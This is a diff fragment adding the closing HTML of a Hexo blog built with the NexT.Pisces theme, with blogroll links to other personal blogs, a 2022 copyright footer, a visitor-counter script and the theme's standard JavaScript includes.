+                    <a href="https://blog.csdn.net/SopRomeo" title="penson" target="_blank">penson</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/lemon629/" title="lemon" target="_blank">lemon</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://surager.pub/" title="5ur4g3r" target="_blank">5ur4g3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.snowywar.top/" title="snowywar" target="_blank">snowywar</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">N0vice</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
